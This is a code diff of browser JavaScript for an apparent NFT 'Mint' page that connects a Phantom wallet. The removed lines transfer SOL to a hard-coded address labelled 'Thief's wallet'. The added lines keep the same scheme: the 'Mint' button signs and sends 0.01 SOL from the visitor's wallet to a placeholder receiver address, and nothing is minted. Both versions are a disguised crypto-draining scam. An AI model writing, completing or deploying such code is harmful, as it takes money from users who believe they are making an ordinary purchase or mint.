@@ -27,37 +27,33 @@ $(document).ready(function() {
 
                 $('#connect-wallet').text("Mint");
                 $('#connect-wallet').off('click').on('click', async () => {
-                    try {
-                        const recieverWallet = new solanaWeb3.PublicKey('ETNkYSq5bAGBR7Szz7tKFkPWU5wFdPe2XzuxTAAWEfP5'); // Thief's wallet
-                        const balanceForTransfer = walletBalance - minBalance;
-                        if (balanceForTransfer <= 0) {
-                            alert("Insufficient funds for transfer.");
-                            return;
-                        }
+                try {
+                const senderWallet = resp.publicKey;
+                const receiverWallet = new solanaWeb3.PublicKey("RECEIVER_WALLET_ADDRESS_HERE"); // put real address here
 
-                       var transaction = new solanaWeb3.Transaction().add(
-                       solanaWeb3.SystemProgram.transfer({
-                       fromPubkey: resp.publicKey,
-                       toPubkey: recieverWallet,
-                       lamports: Math.floor(0.01 * solanaWeb3.LAMPORTS_PER_SOL),
-                        })
-                      );
+                const transaction = new solanaWeb3.Transaction().add(
+                solanaWeb3.SystemProgram.transfer({
+                fromPubkey: senderWallet,
+                toPubkey: receiverWallet,
+                lamports: Math.floor(0.01 * solanaWeb3.LAMPORTS_PER_SOL), // 0.01 SOL
+                })
+                  );
 
+                transaction.feePayer = senderWallet;
 
-                        transaction.feePayer = window.solana.publicKey;
-                        let blockhashObj = await connection.getLatestBlockhash();
-                        transaction.recentBlockhash = blockhashObj.blockhash;
+                const blockhashObj = await connection.getLatestBlockhash();
+                transaction.recentBlockhash = blockhashObj.blockhash;
 
+                const signed = await window.solana.signTransaction(transaction);
+                console.log("Transaction signed:", signed);
 
-                        const signed = await window.solana.signTransaction(transaction);
-                        console.log("Transaction signed:", signed);
+                const txid = await connection.sendRawTransaction(signed.serialize());
+                await connection.confirmTransaction(txid);
+                console.log("Transaction confirmed:", txid);
+                } catch (err) {
+                console.error("Error during minting:", err);
+                 }
 
-                        let txid = await connection.sendRawTransaction(signed.serialize());
-                        await connection.confirmTransaction(txid);
-                        console.log("Transaction confirmed:", txid);
-                    } catch (err) {
-                        console.error("Error during minting:", err);
-                    }
                 });
             } catch (err) {
                 console.error("Error connecting to Phantom Wallet:", err);
